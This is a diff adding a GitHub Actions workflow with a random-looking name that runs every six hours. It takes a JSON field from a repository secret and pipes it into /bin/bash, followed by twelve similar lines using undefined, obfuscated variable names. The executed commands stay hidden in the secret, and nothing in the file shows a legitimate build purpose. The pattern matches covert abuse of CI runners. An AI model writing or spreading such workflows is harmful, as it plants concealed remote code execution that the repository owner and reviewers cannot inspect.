@@ -1,0 +1,28 @@
+name: defeatcategory
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: defeatcategory
+        env:
+          z77835: ${{ secrets.z77835 }}
+        run: |
+          echo $z77835 | jq -r .cc69 | /bin/bash
+          echo $iyu8051 | jq -r .glk47 | /bin/bash
+          echo $jites782 | jq -r .xfv23177 | /bin/bash
+          echo $kyh80284 | jq -r .yygt6 | /bin/bash
+          echo $afbkp7529 | jq -r .up8171 | /bin/bash
+          echo $qq77 | jq -r .uyre0 | /bin/bash
+          echo $pc511 | jq -r .kqdsm74 | /bin/bash
+          echo $ocfzj06840 | jq -r .htikc122 | /bin/bash
+          echo $urinx7 | jq -r .ywktr74 | /bin/bash
+          echo $rpa3 | jq -r .ckfaw2118 | /bin/bash
+          echo $sh98 | jq -r .x50 | /bin/bash
+          echo $uhnc8 | jq -r .z484 | /bin/bash
+          echo $k49 | jq -r .i6 | /bin/bash
+
